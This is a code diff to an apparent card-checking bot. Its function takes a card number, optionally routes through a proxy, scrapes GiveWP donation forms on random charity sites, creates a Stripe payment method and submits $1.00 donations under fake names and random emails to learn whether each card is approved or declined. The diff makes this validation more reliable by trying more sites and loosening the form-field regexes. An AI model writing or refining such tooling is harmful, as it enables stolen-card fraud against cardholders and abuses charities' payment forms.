@@ -326,13 +326,18 @@ def check_stripe_donation(cc, proxy=None):
     if not sites:
         return "❌ No donation sites configured. Use /stsite to add.", "ERROR"
 
-    # Try up to 3 random sites
-    for attempt in range(min(3, len(sites))):
+    # Try up to 5 random sites to increase chance of success
+    for attempt in range(min(5, len(sites))):
         site = random.choice(sites)
         site_url = site['url']
-        pk = site['pk']
-        site_type = site.get('type', 'givewp')  # default givewp
+        pk = site.get('pk')
+        site_type = site.get('type', 'givewp')
         logger.info(f"Trying site: {site_url} (type: {site_type})")
+
+        # Skip if no pk
+        if not pk:
+            logger.warning(f"No publishable key for {site_url}")
+            continue
 
         try:
             session = requests.Session()
@@ -355,13 +360,24 @@ def check_stripe_donation(cc, proxy=None):
                 logger.warning(f"Unsupported site type: {site_type}")
                 continue
 
-            # Extract GiveWP form fields
-            form_id = re.search(r'name="give-form-id" value="(.*?)"', html)
-            form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html)
-            price_id = re.search(r'name="give-price-id" value="(.*?)"', html)
+            # Extract GiveWP form fields – use more flexible regex
+            form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
+            form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
+            price_id = re.search(r'name="give-price-id"\s+value="([^"]+)"', html)
+
+            if not (form_id and form_hash and price_id):
+                # Try alternative patterns (sometimes fields are in different quotes)
+                form_id = re.search(r'name="give-form-id".*?value=["\']([^"\']+)', html, re.DOTALL)
+                form_hash = re.search(r'name="give-form-hash".*?value=["\']([^"\']+)', html, re.DOTALL)
+                price_id = re.search(r'name="give-price-id".*?value=["\']([^"\']+)', html, re.DOTALL)
+
             if not (form_id and form_hash and price_id):
                 logger.warning(f"Missing GiveWP form fields on {site_url}")
                 continue
+
+            form_id = form_id.group(1)
+            form_hash = form_hash.group(1)
+            price_id = price_id.group(1)
 
             # Create Stripe payment method
             pm_id, err = create_stripe_payment_method(session, cc, pk, ua)
@@ -373,11 +389,11 @@ def check_stripe_donation(cc, proxy=None):
             parsed = urlparse(site_url)
             ajax_url = f"{parsed.scheme}://{parsed.netloc}/wp-admin/admin-ajax.php"
             data = {
-                'give-form-id': form_id.group(1),
-                'give-form-hash': form_hash.group(1),
-                'give-price-id': price_id.group(1),
+                'give-form-id': form_id,
+                'give-form-hash': form_hash,
+                'give-price-id': price_id,
                 'give-amount': '1.00',
-                'give_first': 'Test',
+                'give_first': 'Ramesh',
                 'give_last': 'User',
                 'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
                 'give-gateway': 'stripe',
@@ -389,8 +405,8 @@ def check_stripe_donation(cc, proxy=None):
             if status == 'APPROVED':
                 return response_text, status
             elif status == 'DECLINED':
-                # If declined, try another site
-                continue
+                # If declined, we can return immediately (or try another site)
+                return response_text, status
             else:
                 # Error, try another site
                 continue
